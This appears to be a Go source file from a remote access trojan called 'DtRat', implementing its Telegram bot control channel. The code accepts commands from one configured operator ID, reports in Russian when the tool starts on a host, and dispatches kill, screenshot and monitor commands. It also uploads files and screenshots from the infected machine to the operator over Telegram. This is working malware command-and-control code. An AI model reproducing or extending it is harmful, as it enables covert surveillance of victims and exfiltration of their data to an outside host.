package bot

import (
	"dtrat/config"
	"dtrat/engine"
	"fmt"
	"sync"
	"sync/atomic"

	tgbotapi "github.com/go-telegram-bot-api/telegram-bot-api"
)

type Tgbot struct {
	bot     *tgbotapi.BotAPI
	updates *tgbotapi.UpdatesChannel
	userID  int64

	cfg     config.Config
	sendMu  sync.Mutex
	waiting atomic.Bool
}

func NewBot(cfg config.Config) (*Tgbot, error) {
	bot, err := tgbotapi.NewBotAPI(cfg.Bot.Token)
	if err != nil {
		return nil, fmt.Errorf("tgbotapi.NewBotAPI: %w", err)
	}

	updateConfig := tgbotapi.NewUpdate(0)
	updateConfig.Timeout = 60
	upd, err := bot.GetUpdatesChan(updateConfig)
	if err != nil {
		return nil, fmt.Errorf("GetUpdatesChan: %w", err)
	}

	b := &Tgbot{
		bot:     bot,
		updates: &upd,
		userID:  int64(cfg.Bot.UserID),
		cfg:     cfg,
	}

	return b, nil
}

func (b *Tgbot) Close() {

}

func (b *Tgbot) Send(s string, args ...any) error {
	b.sendMu.Lock()
	defer b.sendMu.Unlock()

	msg := tgbotapi.NewMessage(b.userID, fmt.Sprintf(s, args...))
	_, err := b.bot.Send(msg)
	return err
}

func (b *Tgbot) SendFile(file string) error {
	b.sendMu.Lock()
	defer b.sendMu.Unlock()

	document := tgbotapi.NewDocumentUpload(b.userID, file)
	_, err := b.bot.Send(document)
	return err
}

func (b *Tgbot) CommandsHandligLoop(engine *engine.Engine) {
	for update := range *b.updates {
		if b.waiting.Load() {
			continue
		}
		if update.Message == nil || update.Message.From.ID != int(b.userID) {
			continue
		}

		command := update.Message.Command()
		args := update.Message.CommandArguments()

		b.commandSwitch(command, args, engine)
	}
}

func (b *Tgbot) WaitAnswer() *tgbotapi.Message {
	if b.waiting.Swap(true) {
		return nil
	}
	defer b.waiting.Store(false)

	for update := range *b.updates {
		if update.Message == nil || update.Message.From.ID != int(b.userID) {
			continue
		}

		return update.Message
	}

	return nil
}

func (b *Tgbot) WakeNotification() {
	b.Send("DtRat Запущен!\n\nХост: %s", b.cfg.General.HostName)
}

func (b *Tgbot) commandSwitch(cmd, args string, engine *engine.Engine) {
	switch cmd {
	case "start":
		b.startCmd()
	case "help":
		b.helpCmd()
	case "kill":
		b.killCmd()
	case "screenshot":
		b.screenshotCmd(engine)
	case "monitor":
		b.monitorCmd(args, engine)
	default:
		b.defaultCmd()
	}
}
